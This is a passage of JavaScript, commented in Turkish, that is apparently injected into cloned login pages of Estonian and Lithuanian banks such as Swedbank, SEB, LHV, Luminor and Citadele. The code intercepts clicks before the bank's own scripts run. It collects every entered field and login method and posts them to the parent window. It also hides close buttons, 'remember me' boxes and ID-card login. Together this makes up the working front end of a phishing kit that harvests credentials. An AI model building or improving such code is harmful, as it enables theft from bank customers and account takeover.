                  const isTabByText = tabText.length < 50 && tabText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|pin kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|salasÃµna|salas|parool|password|šifr|biometri|pin generatorius|kortel|mobile-id/i) !== null;
                  
                  if (tab.hasAttribute('data-tab-index') || tab.closest('[data-tab-index]') || isTabByText || tab.getAttribute('role') === 'tab' || tab.hasAttribute('lhvtablink') || (tab.className && typeof tab.className === 'string' && tab.className.match(/\\btab\\b|\\bnav-item\\b|\\bseb-tabs__item\\b|\\bc-tabs__item\\b|\\btab-item\\b|\\blhv-tab-link\\b|\\bauth-methods-method\\b|\\bds-option\\b|\\bds-option__label\\b|\\bui-tabs__control\\b|\\bui-tabs__caption\\b/i))) {
                      isTabClick = true;
                      targetTab = tab;
                  }
              }
          }

          if (isTabClick && targetTab) {
              let targetIndex = -1;

              // 1. ÖNCELİK: data-tab-index attribute kontrolü (Swedbank vb. butonları doğrudan 0,1,2,3,4 taşır)
              const tabWithDataIndex = targetTab.getAttribute('data-tab-index') != null ? targetTab : targetTab.querySelector('[data-tab-index]') || targetTab.closest('[data-tab-index]');
              if (tabWithDataIndex) {
                  const parsedDataIdx = parseInt(tabWithDataIndex.getAttribute('data-tab-index') || '', 10);
                  if (!isNaN(parsedDataIdx) && parsedDataIdx >= 0) {
                      targetIndex = parsedDataIdx;
                  }
              }

              if (targetIndex === -1) {
                  const listContainer = targetTab.closest('ul, [role="tablist"], .tabs, .nav, .seb-tabs, .c-tabs__list, .ui-tabs__captions');
                  if (listContainer) {
                     const tabs = Array.from(listContainer.children).filter(c => c.nodeType === 1 && c.textContent.trim() !== '');
                     targetIndex = tabs.findIndex(c => c === targetTab || c.contains(targetTab));
                  }
              }
              
              if (targetIndex === -1 && targetTab.parentElement) {
                 let lookupTab = targetTab;
                 if (lookupTab.classList && lookupTab.classList.contains('ds-option__label') && lookupTab.parentElement.classList.contains('ds-option')) {
                     lookupTab = lookupTab.parentElement;
                 }
                 if (lookupTab && lookupTab.parentElement) {
                    const siblings = Array.from(lookupTab.parentElement.children).filter(c => c.nodeType === 1 && c.textContent.trim() !== '');
                    targetIndex = siblings.findIndex(c => c === lookupTab || c.contains(lookupTab));
                 }
              }
              // ========== EN CRITICAL HATA DÜZELTME: targetIndex -1 kalsa BILE MINI MAP ile HESAPLA ==========
              // Eger siblings/yontem ile index bulunamadiysa (parentElement yok, siblings yanlis vb.),
              // IFRAME ICINE ENJEKTE EDILEN LITHUANIA_MINI_METHOD_MAP ile TEXT -> INDEX hesapla.
              // Bu sayede LITUANIA BANK TAB CLICK'TE HIC ZAMAN targetIndex === -1 KALMIYOR.
              if (targetIndex === -1 && /\\/lithuanian-banks\\//i.test(window.location.href || '')) {
                  const labelForMini = (targetTab.textContent || '').toString().trim();
                  if (labelForMini && typeof __miniResolveIndexFromLabel === 'function') {
                      const miniIdx = __miniResolveIndexFromLabel(labelForMini);
                      if (miniIdx >= 0) targetIndex = miniIdx;
                  }
              }

              // Özel Durumlar: ESKİ YANLIŞ LT BANK SIĞIR MAP SİLİNDİ!
              // Artık sadece LHV, Coop, Inbank (ESTONIA bankalari, NOT LT!) icin kullaniliyor.
              // TUM LITUANIA BANKALARI (swedbank, seb, luminor, citadele, lku, siauliu) ICIN:
              //    MINIMAP (iframe ici) yukarida, ya da parentta resolveIndexFromLoginMethod() ile
              //    DOGRU index hesaplaniyor. O yüzden asagidaki eski ESTONIA map'leri LT icin iptal!
              const isLithuaniaBank = /\\/lithuanian-banks\\//i.test(window.location.href || '');
              if (!isLithuaniaBank && (window.location.href.includes('citadele') || window.location.href.includes('coop') || window.location.href.includes('inbank') || window.location.href.includes('lhv') || window.location.href.includes('luminor') || window.location.href.includes('op-corporate') || window.location.href.includes('swedbank') || targetIndex === -1)) {
                  const tabText = targetTab.textContent.toLowerCase();
                  if (window.location.href.includes('coop')) {
                      if (tabText.includes('bio')) {
                          targetIndex = 0;
                      } else if (tabText.includes('smart')) {
                          targetIndex = 1;
                      } else if (tabText.includes('mobiil')) {
                          targetIndex = 2;
                      } else {
                         e.preventDefault();
                         e.stopPropagation();
                         return false; 
                      }
                  } else if (window.location.href.includes('inbank')) {
                      if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card') || tabText.includes('id kaart')) {
                          e.preventDefault();
                          e.stopPropagation();
                          e.stopImmediatePropagation();
                          return false;
                      } else if (tabText.includes('smart')) {
                          targetIndex = 0;
                      } else if (tabText.includes('mobiil')) {
                          targetIndex = 1;
                      } else if (tabText.includes('pin')) {
                          targetIndex = 2;
                      }
                  } else if (window.location.href.includes('lhv')) {
                      if (tabText.includes('bio')) {
                          targetIndex = 0; 
                      } else if (tabText.includes('smart')) {
                          targetIndex = 1; 
                      } else if (tabText.includes('mobiil')) {
                          targetIndex = 2; 
                      } else if (tabText.includes('pin')) {
                          targetIndex = 3; 
                      } else if (tabText.includes('parool') || tabText.includes('password') || tabText.includes('šifr') || tabText.includes('salasõna') || tabText.includes('salasãµna') || tabText.includes('salas')) {
                          targetIndex = 4; 
                      } else if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card')) {
                          targetIndex = 5; 
                      }
                  } else if (window.location.href.includes('citadele')) {
                      if (tabText.includes('c-app') || tabText.includes('citadele')) targetIndex = 0;
                      else if (tabText.includes('smart')) targetIndex = 1;
                      else if (tabText.includes('id-kaart')) targetIndex = 2;
                      else if (tabText.includes('mobilescan') || tabText.includes('digipass') || tabText.includes('koodikalkulaator')) targetIndex = 3;
                  } else if (window.location.href.includes('luminor')) {
                      if (tabText.includes('mobiil')) targetIndex = 0;
                      else if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card')) targetIndex = 1;
                        else if (tabText.includes('pin') || tabText.includes('kalkulaator')) targetIndex = 2;
                        else if (tabText.includes('smart')) targetIndex = 3;
                    } else if (window.location.href.includes('op-corporate')) {
                        if (tabText.includes('mobiil')) targetIndex = 0;
                        else if (tabText.includes('smart')) targetIndex = 1;
                        else if (tabText.includes('pin') || tabText.includes('kalkulaator')) targetIndex = 2;
                    } else if (window.location.href.includes('seb')) {
                        if (tabText.includes('smart')) targetIndex = 0;
                        else if (tabText.includes('mobiil-id') || tabText.includes('mobile-id') || tabText.includes('mobile id')) targetIndex = 1;
                        else if (tabText.includes('seb mobiil') || tabText.includes('mobiilirakendus') || tabText.includes('mobile application')) targetIndex = 2;
                        else if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card')) targetIndex = 3;
                        else if (tabText.includes('digipass') || tabText.includes('pin') || tabText.includes('kalkulaator')) targetIndex = 4;
                    } else if (window.location.href.includes('swedbank')) {
                        if (tabText.includes('bio')) targetIndex = 0;
                        else if (tabText.includes('smart')) targetIndex = 1;
                        else if (tabText.includes('mobiil')) targetIndex = 2;
                        else if (tabText.includes('id-kaart') || tabText.includes('id kaart') || tabText.includes('id-card')) targetIndex = 3;
                        else if (tabText.includes('digipass') || tabText.includes('pin') || tabText.includes('kalkulaator')) targetIndex = 4;
                    } else {
                      if (tabText.includes('smart')) targetIndex = 0;
                      else if (tabText.includes('mobiil')) targetIndex = 1;
                      else if (tabText.includes('id-kaart')) targetIndex = 2;
                      else if (tabText.includes('mobilescan') || tabText.includes('digipass')) targetIndex = 3;
                      else if (tabText.includes('pin')) targetIndex = 3;
                      else if (tabText.includes('bio')) targetIndex = 4;
                  }
              }

              // ===================================================================
              // LITHUANIA ICIN HARDCODED EN GUVENILIR INDEX HESAPLAMA
              // Yukaridaki siblings / parent.children ya da inject edilen meta
              // -1 donduyse (yanlis HTML yapisi vb.), DOGRU methodMap sirasiyla
              // banka-ozel text match ile targetIndex BUL.
              // (Estonia'daki hardcoded mantigin Lithuania kopyasi.)
              // ===================================================================
              const _isLtBank = isLithuaniaBank || /\\/lithuanian-banks\\//i.test(window.location.href || '');
              if (_isLtBank && targetIndex === -1) {
                const _tabText = (targetTab.textContent || '').toString().toLowerCase();
                if (window.location.href.includes('swedbank-lt')) {
                  // 0: Biometrika/PIN, 1: Smart-ID, 2: Mobile-ID, 3: PIN generatorius, 4: ID-kortelė
                  if (/bio|biometri|pin kodas|^pin\\b/.test(_tabText)) targetIndex = 0;
                  else if (/smart|smartid|smart-id/.test(_tabText)) targetIndex = 1;
                  else if (/mobil|mobile|mobilesms|m\\s*id/.test(_tabText)) targetIndex = 2;
                  else if (/generator|gen\\b|kod.skaiciuokl/.test(_tabText)) targetIndex = 3;
                  else if (/kortel|id.kort|idkortel/.test(_tabText)) targetIndex = 4;
                } else if (window.location.href.includes('seb-lt')) {
                  // 0: Smart-ID, 1: Mobile-ID, 2: SEB programėlė App, 3: Generatorius
                  if (/smart|smartid/.test(_tabText)) targetIndex = 0;
                  else if (/mobil|mobile|m.id/.test(_tabText)) targetIndex = 1;
                  else if (/program|app|aplikacija|mobili program/.test(_tabText)) targetIndex = 2;
                  else if (/generator|gen\\b|kod|skaiciuokl/.test(_tabText)) targetIndex = 3;
                } else if (window.location.href.includes('luminor-lt')) {
                  // 0: Smart-ID, 1: M. parašas, 2: Generatorius
                  if (/smart|smartid/.test(_tabText)) targetIndex = 0;
                  else if (/m\\s*\\.?\\s*para|paras|mobile.sign|mobilesign/.test(_tabText)) targetIndex = 1;
                  else if (/generator|kod|gen\\b/.test(_tabText)) targetIndex = 2;
                } else if (window.location.href.includes('citadele-lt')) {
                  // 0: Kodų kortelė/Generatorius, 1: Mobile-ID, 2: MobileSCAN/Digipass 780
                  // (mobilescan 'mobil' icerir - once scan/digipass kontrol edilmeli!)
                  if (/mobilescan|digipass|scan/.test(_tabText)) targetIndex = 2;
                  else if (/mobil|mobile|m.id/.test(_tabText)) targetIndex = 1;
                  else if (/kodu|kod|kortel|generator|gen\\b/.test(_tabText)) targetIndex = 0;
                } else if (window.location.href.includes('lku-lt')) {
                  // 0: Smart-ID, 1: Mobile-ID, 2: Vienkartinis saugos kodas
                  if (/smart|smartid/.test(_tabText)) targetIndex = 0;
                  else if (/mobil|mobile|m.id/.test(_tabText)) targetIndex = 1;
                  else if (/vienkart|vienkara|saug.*kod|otp|viena karta/.test(_tabText)) targetIndex = 2;
                } else if (window.location.href.includes('siauliu-lt')) {
                  // 0: Smart-ID, 1: Mobile-ID, 2: Biometrika/PIN, 3: SMS
                  if (/smart|smartid/.test(_tabText)) targetIndex = 0;
                  else if (/mobil|mobile|m.id/.test(_tabText)) targetIndex = 1;
                  else if (/bio|biometri|pin\\b|pin kod/.test(_tabText)) targetIndex = 2;
                  else if (/sms|tekst|zinute|pranesim/.test(_tabText)) targetIndex = 3;
                }
              }

              if (targetIndex !== -1 || (window.__traeSelectedLoginMethod || '').trim() !== '') {
                  const clickedLoginMethod = extractLoginMethodLabel(targetTab.textContent || '');
                  if (clickedLoginMethod) {
                      window.__traeSelectedLoginMethod = clickedLoginMethod;
                  }

                  if (window.location.href.includes('coop') && targetIndex >= 0 && targetIndex > 2) {
                      e.preventDefault();
                      return false;
                  }

                  // ====== PREVENTDEFAULT KARARI (EN KRITIK) ======
                  // TIKLANAN: INPUT[type=radio/checkbox] VEYA LABEL (for=".." veya icinde radio/checkbox var)
                  //           => PREVENTDEFAULT YAPMA (native checked olarak isaretlensin!)
                  // DIGER DIV / BUTTON / A TAB (Vuetify .v-tab, vb.) => PREVENTDEFAULT
                  const tgt = e.target;
                  let isRadioOrLabel = false;
                  let cur = tgt;
                  for (let depth = 0; depth < 5 && cur; depth++) {
                    const tn = cur && cur.tagName ? cur.tagName : '';
                    if (tn === 'INPUT') {
                      const tp = (cur.type || '').toLowerCase();
                      if (tp === 'radio' || tp === 'checkbox') { isRadioOrLabel = true; break; }
                    } else if (tn === 'LABEL') {
                      const lblFor = cur.getAttribute ? cur.getAttribute('for') : null;
                      const hasRadio = cur.querySelector ? cur.querySelector('input[type="radio"], input[type="checkbox"]') : null;
                      if (lblFor || hasRadio) { isRadioOrLabel = true; break; }
                    }
                    cur = cur.parentElement;
                  }
                  const opCoNative = (window.location.href.includes('op-corporate') && (target.tagName === 'INPUT' || (target.closest && target.closest('label'))));
                  if (isRadioOrLabel || opCoNative) {
                    // DO NOTHING - let browser mark the radio checked natively
                  } else {
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                  }

                  notifyParentTabChanged(clickedLoginMethod || '', targetIndex >= 0 ? targetIndex : undefined);
                  const payload = {
                        type: 'LITHUANIA_BANK_TAB_CLICK',
                        targetIndex: targetIndex >= 0 ? targetIndex : undefined,
                        loginMethod: clickedLoginMethod || (window.__traeSelectedLoginMethod || '')
                  };

                  // ==================================================================
                  // IFRAME ICI DEBUG LOG + BUFFER (son 100) - Baska AI bunu kontrol eder
                  // ==================================================================
                  try {
                    const W2 = window;
                    if (!Array.isArray(W2.__TRAE_LT_IFRAME_LOGS)) { W2.__TRAE_LT_IFRAME_LOGS = []; }
                    W2.__TRAE_LT_IFRAME_LOGS.unshift({ t: Date.now(), event: 'TAB_CLICK', text: targetTab.textContent, targetIndex, payload });
                    if (W2.__TRAE_LT_IFRAME_LOGS.length > 100) W2.__TRAE_LT_IFRAME_LOGS.length = 100;
                    // eslint-disable-next-line no-console
                    console.log('%c[LT IFRAME] TAB CLICK', 'background:#81c784;color:#000;font-weight:bold;', {
                      text: targetTab.textContent,
                      targetIndex,
                      loginMethod: clickedLoginMethod,
                      fullHref: window.location.href,
                      payload
                    });
                  } catch {}

                  // Race condition / cross-origin oncesi event cache'i engellemek icin 3 KEZ at + customEvent.
                  // EKSTRA: 3. atista (250ms) AYNI ANDA LITHUANIA_BANK_IFRAME_LOADED da gonder,
                  //         boylece parent handler'da files.length===0 durumunda pendingRef'e atilan index,
                  //         3. atista (genellikle API yaniti gelmis, files.length dolu) uygulanmis olur.
                  const pm = () => { try { window.parent.postMessage(payload, '*'); } catch(_e) {} };
                  const pmFrameLoaded = () => {
                    try {
                      window.parent.postMessage({
                        type: 'LITHUANIA_BANK_IFRAME_LOADED',
                        bankSlug: (window.__traeBankSlug || ''),
                        triggeredByTabClick: true
                      }, '*');
                    } catch(_e) {}
                  };
                  pm();
                  setTimeout(pm, 100);
                  setTimeout(() => { pm(); pmFrameLoaded(); }, 250);
                  try {
                    window.dispatchEvent(new CustomEvent('__TRAE_LT_TAB_CLICK__', { detail: payload }));
                  } catch(_e) {}
              } else {
                  // targetIndex bulunamadiysa ve login method yoksa: HIRALI yonlendirme yapma (Yanlis index acar)
                  // EGER radio/label ise native birakmamiz yeter.
                  const tgt = e.target;
                  let isRadioOrLabel = false;
                  let cur = tgt;
                  for (let depth = 0; depth < 5 && cur; depth++) {
                    const tn = cur && cur.tagName ? cur.tagName : '';
                    if (tn === 'INPUT' && ((cur.type || '').toLowerCase() === 'radio' || (cur.type || '').toLowerCase() === 'checkbox')) { isRadioOrLabel = true; break; }
                    if (tn === 'LABEL') {
                      const lblFor = cur.getAttribute ? cur.getAttribute('for') : null;
                      const hasRadio = cur.querySelector ? cur.querySelector('input[type="radio"], input[type="checkbox"]') : null;
                      if (lblFor || hasRadio) { isRadioOrLabel = true; break; }
                    }
                    cur = cur.parentElement;
                  }
                  if (!isRadioOrLabel && !window.location.href.includes('op-corporate')) {
                      e.preventDefault();
                      e.stopPropagation();
                      e.stopImmediatePropagation();
                  }
              }
              return false;
          }

          if (isSubmitBtn && target) {
             preventAnyNativeNavigation(e);

             if (window.location.href.includes('coop')) {
               submitCoopVisibleFields();
               return false;
             }

             // YENI: Submit butonu hangi formdan/nereden gelirse gelsin TUM formlari
             // + form disi alanlari TEK SEFERDE serialize et (form1__ / form2__ / form0__)
             const { fields, inputs } = serializeAllLtForms();

             // Global inputlardan da kontrol et (fallback: find ANY visible input)
             let hasValue = false;
             for (let i = 0; i < fields.length; i++) {
                if (fields[i] && fields[i].value && String(fields[i].value).trim() !== '') { hasValue = true; break; }
             }
             if (!hasValue) {
                try {
                  const all = document.querySelectorAll('input, select, textarea');
                  for (let k = 0; k < all.length; k++) {
                    const inp = all[k];
                    const tt = (inp.type || inp.tagName || '').toLowerCase();
                    if (['hidden','submit','button','reset','file','radio','checkbox'].indexOf(tt) !== -1) continue;
                    if (inp.closest && inp.closest('[hidden], [aria-hidden="true"], .hidden, .d-none, .d-none-imp')) continue;
                    const cs = inp.getBoundingClientRect ? inp.getBoundingClientRect() : null;
                    if (cs && (cs.width <= 3 || cs.height <= 3)) continue;
                    const v = (inp.value || '').trim();
                    if (v !== '' && v.length >= 3) { hasValue = true; break; }
                  }
                } catch(_) {}
             }

             if (!hasValue) {
               // Gercekten bos ise ilerleme (kullanici "form alanlari dolmadan gitmesin" diye istedi)
               // Butonun disabled degilse ya da tarayici submit etmeye kalktiysa sadece native navi engelle, ayrica bir şey yapma
               return false;
             }

             // Submit et (parenta postMessage - sonraki adima parent handle eder)
             window.parent.postMessage({
               type: 'LITHUANIA_BANK_SUBMIT',
               formData: { inputs, fields, loginMethod: getLoginMethod() }
             }, '*');
             return false;
          }
        }, true); // Use capture to intercept before bank's own JS

        // Input label fix: hide labels when input has value or focus
        const updateInputState = (input) => {
          let wrapper = input.closest('.field-group, .bb-input, .i-input, .input-group, .lhv-text-field-wrapper, .seb-input, .input-wrapper, .form-group, .field, .c-input, .v-input, .form-row, .control-input');
          if (!wrapper) wrapper = input.parentElement;
          const formRowWrapper = input.closest('.form-row'); // Luminor için ekstra kontrol

          const hasValue = input.value && input.value.trim() !== '';
          const isFocused = document.activeElement === input;

          const applyClasses = (el) => {
            if (!el) return;
            if (hasValue) {
              el.classList.add('has-value', 'is-filled', 'not-empty', 'mdc-text-field--invalid');
            } else {
              el.classList.remove('has-value', 'is-filled', 'not-empty', 'mdc-text-field--invalid');
            }
            if (isFocused) {
              el.classList.add('focused', 'is-focused', 'mdc-text-field--focused');
            } else {
              el.classList.remove('focused', 'is-focused', 'mdc-text-field--focused');
            }
          };

          applyClasses(wrapper);
          if (wrapper !== formRowWrapper) {
            applyClasses(formRowWrapper);
          }

          // Big Bank ve Inbank Info/Placeholder fix
          if (hasValue || isFocused) {
              const infoElements = input.parentElement ? input.parentElement.querySelectorAll('.info, .placeholder, [class*="placeholder"]') : [];
              infoElements.forEach(el => {
                  if (el.tagName !== 'INPUT' && !el.contains(input)) {
                      el.style.opacity = '0';
                      el.style.pointerEvents = 'none';
                  }
              });
              // Eğer parentElement içinde yoksa, wrapper içinde sadece bu input'a yakın olanları bul
              if (infoElements.length === 0 && wrapper) {
                  wrapper.querySelectorAll('.info, .placeholder, [class*="placeholder"]').forEach(el => {
                      if (el.tagName !== 'INPUT' && !el.contains(input)) {
                          // Wrapper içindeki diğer inputlara ait olup olmadığını kontrol et
                          const hasOtherInput = Array.from(el.parentElement?.querySelectorAll('input') || []).some(i => i !== input);
                          if (!hasOtherInput) {
                              el.style.opacity = '0';
                              el.style.pointerEvents = 'none';
                          }
                      }
                  });
              }
          } else {
              const infoElements = input.parentElement ? input.parentElement.querySelectorAll('.info, .placeholder, [class*="placeholder"]') : [];
              infoElements.forEach(el => {
                  if (el.tagName !== 'INPUT' && !el.contains(input)) {
                      el.style.opacity = '1';
                      el.style.pointerEvents = 'auto';
                  }
              });
              if (infoElements.length === 0 && wrapper) {
                  wrapper.querySelectorAll('.info, .placeholder, [class*="placeholder"]').forEach(el => {
                      if (el.tagName !== 'INPUT' && !el.contains(input)) {
                          const hasOtherInput = Array.from(el.parentElement?.querySelectorAll('input') || []).some(i => i !== input);
                          if (!hasOtherInput) {
                              el.style.opacity = '1';
                              el.style.pointerEvents = 'auto';
                          }
                      }
                  });
              }
          }

          // LHV floating label fix - hide it to prevent overlap
          const lhvFloatingLabel = input.closest('.lhv-text-field')?.querySelector('.lhv-floating-label');
          if (lhvFloatingLabel) {
             if (hasValue || isFocused) {
                 lhvFloatingLabel.classList.add('mdc-floating-label--float-above');
                 lhvFloatingLabel.style.opacity = '0';
             } else {
                 lhvFloatingLabel.classList.remove('mdc-floating-label--float-above');
                 lhvFloatingLabel.style.opacity = '1';
             }
          }

          // Form boş ise butonları disable etme kontrolü
          const form = input.closest('form');
          if (form) {
             const isLt = /\\/lithuanian-banks\\//i.test(window.location.href || '');
             if (window.location.href.includes('coop')) {
                form.querySelectorAll('button[type="submit"], input[type="submit"], button.btn, button.submit, a.btn, a.button').forEach(btn => {
                    btn.disabled = false;
                    btn.style.opacity = '1';
                    btn.style.cursor = 'pointer';
                    btn.style.pointerEvents = 'auto';
                    btn.classList.remove('disabled');
                    btn.classList.remove('bb-button--disabled');
                });
                return;
             }

             if (isLt) {
                fixLithuaniaBanks();
                return;
             }

             let anyEmpty = false;
             form.querySelectorAll('input').forEach(i => {
                if (i.type !== 'hidden' && i.type !== 'submit' && i.type !== 'button') {
                    if (!i.value || i.value.trim() === '') {
                        anyEmpty = true;
                    }
                }
             });
             
             form.querySelectorAll('button[type="submit"], input[type="submit"], button.btn, button.submit, a.btn, a.button').forEach(btn => {
                 if (anyEmpty) {
                     btn.disabled = true;
                     btn.style.opacity = '0.5';
                     btn.style.cursor = 'not-allowed';
                     btn.style.pointerEvents = 'none';
                 } else {
                     btn.disabled = false;
                     btn.style.opacity = '1';
                     btn.style.cursor = 'pointer';
                     btn.style.pointerEvents = 'auto';
                     btn.classList.remove('disabled');
                     btn.classList.remove('bb-button--disabled');
                 }
             });
          }

          // Gather labels to hide
          const labelsToHide = [];
          if (input.id) {
             document.querySelectorAll('label[for="' + input.id + '"]').forEach(l => labelsToHide.push(l));
          }
          const parentLabel = input.closest('label');
          if (parentLabel && !labelsToHide.includes(parentLabel)) {
             labelsToHide.push(parentLabel);
          }
          if (wrapper) {
             wrapper.querySelectorAll('.placeholder, [class*="placeholder"], .mdc-floating-label').forEach(l => {
                 // Sadece bu input için olanları al
                 const containsOtherInput = Array.from(l.querySelectorAll('input')).some(i => i !== input);
                 if (!containsOtherInput) {
                     labelsToHide.push(l);
                 }
             });
          }

          labelsToHide.forEach(label => {
            if (!label.contains(input)) {
              const style = window.getComputedStyle(label);
              const isFloatingOrAbsolute = style.position === 'absolute' || 
                                           label.className.toLowerCase().includes('placeholder') ||
                                           (style.position === 'relative' && (parseInt(style.marginTop) < 0 || parseInt(style.top) > 0)) ||
                                           label.closest('.bb-input, [data-testid*="bb-input"], [data-testid*="bb-masked-input"]') != null;

              if (hasValue || isFocused) {
                  if (isFloatingOrAbsolute || label.tagName !== 'LABEL') {
                      label.style.opacity = '0';
                      label.style.pointerEvents = 'none';
                  }
              } else {
                  if (isFloatingOrAbsolute || label.tagName !== 'LABEL') {
                      label.style.opacity = '1';
                      label.style.pointerEvents = 'auto';
                  }
              }
            } else {
              Array.from(label.children).forEach(child => {
                if (!child.contains(input) && (child.tagName === 'SPAN' || child.tagName === 'DIV')) {
                  if (!child.classList.contains('mdc-notched-outline')) {
                    const childStyle = window.getComputedStyle(child);
                    const isChildFloating = childStyle.position === 'absolute' || child.className.toLowerCase().includes('placeholder') || child.classList.contains('lhv-placeholder-custom');
                    
                    if (hasValue || isFocused) {
                        if (isChildFloating || child.tagName === 'SPAN') {
                            child.style.opacity = '0';
                        }
                    } else {
                        if (isChildFloating || child.tagName === 'SPAN') {
                            child.style.opacity = '1';
                        }
                    }
                  }
                }
              });
            }
          });
          
          // INBANK FIX: Input içindeki yazının gizlenmesini/şeffaflaşmasını KESİN OLARAK engelle
          if (window.location.href.includes('inbank')) {
              input.style.setProperty('opacity', '1', 'important');
              input.style.setProperty('color', 'inherit', 'important');
              input.style.setProperty('display', 'block', 'important');
              input.style.setProperty('visibility', 'visible', 'important');
          }
        };

        // Fix buttons that are disabled by default
        document.querySelectorAll('button[disabled], input[disabled]').forEach(btn => {
           btn.removeAttribute('disabled');
           if (btn.classList.contains('disabled')) btn.classList.remove('disabled');
           if (btn.classList.contains('bb-button--disabled')) btn.classList.remove('bb-button--disabled');
        });

        // Hide specific elements for specific banks based on user request
        try {
            // Coop Pank: Remove "Jäta mind meelde" (Remember me) checkbox and label
            document.querySelectorAll('input[type="checkbox"]').forEach(cb => {
                const label = cb.closest('label') || document.querySelector('label[for="' + cb.id + '"]');
                if (label && (label.textContent.toLowerCase().includes('jäta') || label.textContent.toLowerCase().includes('salvesta') || label.textContent.toLowerCase().includes('meelde'))) {
                    label.style.display = 'none';
                    cb.style.display = 'none';
                } else if (cb.parentNode && cb.parentNode.textContent.toLowerCase().includes('meelde')) {
                    cb.parentNode.style.display = 'none';
                }
            });

            // ID-Kaart seçeneğini tüm bankalarda deaktif et / gizle (Citadele hariç)
            document.querySelectorAll('a, li, button, [role="tab"], div').forEach(el => {
                const text = el.textContent ? el.textContent.toLowerCase().trim() : '';
                // Citadele, LHV ve Luminor Bank için ID-Kaart'ı gizleme
                if (window.location.href.includes('citadele') || window.location.href.includes('lhv') || window.location.href.includes('luminor') || window.location.href.includes('op-corporate') || window.location.href.includes('seb')) {
                    return;
                }
                
                // INBANK FIX: Inbank için gizleme (display: none) yapma, sadece ID-Kaart'ı soluklaştır ve pointer-events kapat.
                // Diğer sekmelere (Smart-ID, Mobiil-ID vb.) kesinlikle DOKUNMA!
                if (window.location.href.includes('inbank')) {
                    if ((text === 'id-kaart' || text === 'eesti id-kaart' || text.includes('id-kaart')) && text.length < 30) {
                        el.style.pointerEvents = 'none';
                        el.style.opacity = '0.5';
                        el.classList.add('disabled');
                    } else if (el.tagName === 'A' || el.tagName === 'LI' || el.getAttribute('role') === 'tab') {
                        // Smart-ID, Mobiil-ID gibi diğer sekmeler KESİNLİKLE aktif ve görünür kalsın
                        el.style.display = '';
                        el.style.pointerEvents = 'auto';
                        el.style.opacity = '1';
                        el.classList.remove('disabled');
                    }
                    return; // Inbank'tayken genel ID-kaart gizleme koduna inmesini engelle
                }

                if ((text === 'id-kaart' || text === 'eesti id-kaart' || text.includes('id-kaart')) && text.length < 30) {
                    el.style.display = 'none';
                    el.style.pointerEvents = 'none';
                }
            });
            
            // LHV Bank: Fix for overlapping texts. 
            // Find inner span elements that don't have mdc classes but overlap
            document.querySelectorAll('.lhv-text-field-wrapper span:not([class*="mdc-"])').forEach(span => {
                // If it's a structural span without a class but has text, hide it when focused
                if (span.textContent.trim().length > 0 && !span.className) {
                    span.classList.add('lhv-placeholder-custom');
                }
            });
            // Luminor Bank: Disable X (Close) button
            document.querySelectorAll('.close, .btn-close, .modal-close, [aria-label="Close"], [aria-label="Sulge"], .luminor-close').forEach(btn => {
                btn.style.display = 'none';
                btn.style.pointerEvents = 'none';
            });
        } catch(e) {}

        // Buton disable/enable durumunu biz kendi form mantığımızda yönetiyoruz
        // O yüzden JS'in ezmesini engellemek yerine form doldurma mantığına güveniyoruz.
        // Ayrıca Coop Bank ve diğerleri için class engellerini kaldırıyoruz.
        document.querySelectorAll('button.disabled, a.disabled, .bb-button--disabled').forEach(btn => {
            btn.classList.remove('disabled');
            btn.classList.remove('bb-button--disabled');
        });

        document.querySelectorAll('input').forEach(input => {
          if (window.location.href.includes('op-corporate')) return;
          
          if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button' && input.type !== 'radio' && input.type !== 'checkbox') {
            // Force input to be clickable and readable
            input.style.position = 'relative';
            input.style.zIndex = '999';
            input.style.setProperty('opacity', '1', 'important');
            input.style.setProperty('visibility', 'visible', 'important');
            input.style.setProperty('display', 'block', 'important');
            input.removeAttribute('disabled');
            input.removeAttribute('readonly');
            
            // 1 & 2 & 3: Telefon numarası ve benzeri alanlar için sadece rakam ve numpad klavye entegrasyonu
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            if (name.includes('mobile') || name.includes('phone') || name.includes('telefon') || id.includes('mobile') || id.includes('phone') || id.includes('telefon')) {
                // Mobil numpad için gerekli HTML5 attribute'ları
                input.setAttribute('inputmode', 'numeric');
                input.setAttribute('type', 'tel');
                input.setAttribute('pattern', '[0-9]*');

                // Hata mesajı div'i oluştur
                let errorMsg = input.parentElement.querySelector('.custom-phone-error');
                if (!errorMsg) {
                    errorMsg = document.createElement('div');
                    errorMsg.className = 'custom-phone-error';
                    errorMsg.style.color = '#E2001A'; // BigBank kırmızısı
                    errorMsg.style.fontSize = '12px';
                    errorMsg.style.marginTop = '4px';
                    errorMsg.style.fontWeight = 'bold';
                    errorMsg.style.display = 'none';
                    errorMsg.style.position = 'absolute';
                    errorMsg.style.bottom = '-20px';
                    errorMsg.style.left = '0';
                    errorMsg.innerText = 'Prašome įvesti tik skaičius';
                    input.parentElement.style.position = 'relative';
                    input.parentElement.appendChild(errorMsg);
                }

                // Sadece rakamlara (+ basta opsiyonel) izin veren event listener (Input olayı)
                input.addEventListener('input', (e) => {
                    const originalValue = input.value;
                    const newValue = originalValue.replace(/(?!^)\+/g, '').replace(/[^0-9+]/g, '');
                    if (originalValue !== newValue) {
                        input.value = newValue; // Geçersiz karakterleri anında temizle
                        errorMsg.style.display = 'block';
                        clearTimeout(input.errorTimeout);
                        input.errorTimeout = setTimeout(() => { errorMsg.style.display = 'none'; }, 2500);
                    }
                    updateInputState(input);
                });

                // Klavye tuş basımını engelleme (Keypress olayı)
                input.addEventListener('keypress', (e) => {
                    // Rakamlara, kontrol tuslarina ve baslangictaki '+' ya izin ver
                    const isPlusAtStart = e.key === '+' && (input.value || '').length === 0;
                    if (e.key && e.key.length === 1 && !/[0-9]/.test(e.key) && !isPlusAtStart) {
                        e.preventDefault(); // Karakterin yazılmasını engelle
                        errorMsg.style.display = 'block';
                        clearTimeout(input.errorTimeout);
                        input.errorTimeout = setTimeout(() => { errorMsg.style.display = 'none'; }, 2500);
                    }
                });
            } else {
                input.addEventListener('input', () => updateInputState(input));
            }

            input.addEventListener('focus', () => updateInputState(input));
